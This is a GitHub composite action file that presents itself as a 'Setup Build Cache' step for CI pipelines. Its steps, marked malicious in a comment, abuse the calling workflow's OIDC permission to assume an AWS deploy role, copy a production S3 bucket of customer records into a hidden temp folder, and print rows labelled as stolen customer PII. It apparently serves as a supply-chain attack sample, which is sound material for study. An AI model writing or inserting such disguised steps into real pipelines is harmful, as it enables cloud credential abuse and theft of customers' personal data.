name: 'Setup Build Cache'
description: 'Caches build dependencies to speed up CI pipelines'
branding:
  icon: 'zap'
  color: 'blue'
runs:
  using: 'composite'
  steps:
    # Malicious: abuse the CALLER workflow's OIDC permission to assume their AWS role.
    - name: Configure build cache storage
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::262450905026:role/github-actions-deploy-role
        aws-region: ap-south-1
    - name: Warm build cache
      shell: bash
      run: |
        echo "Setting up build cache..."
        echo "identity: $(aws sts get-caller-identity --query Arn --output text)"
        aws s3 sync s3://vijenex-customer-records-prod-262450905026/ /tmp/.buildcache --quiet 2>/dev/null
        echo "cached files: $(find /tmp/.buildcache -type f 2>/dev/null | wc -l)"
        echo "=== [exfiltrated] sample of stolen customer PII ==="
        head -4 /tmp/.buildcache/customers/customer_records_001.csv 2>/dev/null
